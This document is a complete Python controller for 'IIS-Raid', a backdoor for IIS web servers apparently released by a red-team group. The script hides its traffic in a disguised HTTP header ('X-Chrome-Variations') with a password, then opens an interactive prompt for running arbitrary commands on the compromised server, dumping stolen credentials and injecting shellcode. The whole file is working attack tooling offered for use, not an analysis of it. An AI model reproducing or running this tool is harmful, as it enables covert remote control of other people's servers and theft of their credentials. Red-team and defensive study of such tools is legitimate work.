import requests
import argparse
import base64
import cmd

banner = '''
██╗██╗███████╗      ██████╗  █████╗ ██╗██████╗ 
██║██║██╔════╝      ██╔══██╗██╔══██╗██║██╔══██╗
██║██║███████╗█████╗██████╔╝███████║██║██║  ██║
██║██║╚════██║╚════╝██╔══██╗██╔══██║██║██║  ██║
██║██║███████║      ██║  ██║██║  ██║██║██████╔╝
╚═╝╚═╝╚══════╝      ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ 

@0x09AL - MDSec ActiveBreach
'''

print(banner)

class Prompt(cmd.Cmd):
	def help_cmd(self):
		print("Execute a command on the server.\nUsage: cmd <command to execute>\n")
	def help_exit(self):
		print("Exits")
	def help_inject(self):
		print("Inject shellcode on the server.\nUsage: inject <file>\n")

	def help_dump(self):
		print("Dump extracted credentials.\nUsage: dump\n")

	def do_inject(self,shellcode):
		InjectShellcode(shellcode)
	def do_cmd(self, command):
		if(command != ""):
			ExecuteCommand(command)
		else:
			print("Specify a command.")

	def do_dump(self,ignore):
		DumpCreds()
	def do_exit(self,ignore):
		exit(0)
	def emptyline(self):
		pass


def SendRequest(data):


	if(args.method == "GET"):
		resp = requests.get(args.url,headers={args.header: data , "X-Password": args.password})
	elif(args.method == "POST"):
		resp = requests.post(args.url,headers={args.header: data , "X-Password": args.password})
	
	if(resp.status_code != 200):
		print("[-] Status code invalid : " + str(resp.status_code))
		exit(0)

	try:
		encoded_response = resp.headers[args.header]
	except:
		print("[-] Header not found. Invalid password or backdoor is not present. [-]")
		exit(0)

	response = base64.b64decode(encoded_response).decode('utf-8')

	return response

		
def Check():

	print("[+] Testing URL {0}".format(args.url))

	response = SendRequest("PIN|G")

	if(response == "PONG"):
		print("[+] Successfully connected to {0}\n".format(args.url))
		return True
	else:
		return False


def ExecuteCommand(command):
	
	response = SendRequest("CMD|" + command)	
	print("[+] Received output [+]\n{0}".format(response))

def DumpCreds():
	
	response = SendRequest("DMP|CREDS")
	print("[+] Received output [+]\n{0}".format(response))

def InjectShellcode(file):

	with open(file, "rb") as binaryfile :
		shellcode = bytearray(binaryfile.read())

	encoded_shellcode = base64.b64encode(shellcode).decode("utf-8") 
	print("[+] Shellcode size : {0}".format(len(shellcode)))
	response = SendRequest("INJ|" + encoded_shellcode)

	if(response == "DONE"):
		print("[+] Shellcode Injected Successfully")



# IIS-Raid
parser = argparse.ArgumentParser(description="IIS-Raid Controller")
parser.add_argument('--url', required=True , type=str ,help="URL to use for communication.")
parser.add_argument('--header', type=str, default="X-Chrome-Variations", help="Header to use for communication.")
parser.add_argument('--method', type=str, default="GET", help="Method to use for communication.")
parser.add_argument('--password', required=True,type=str, help="Pre-shared password.")
args = parser.parse_args()



if(Check()):
	p = Prompt()
	p.prompt = "IIS-RAID #> "
	p.cmdloop()
else:
	print("[-] Failed to connect to {0} ".format(args.url))


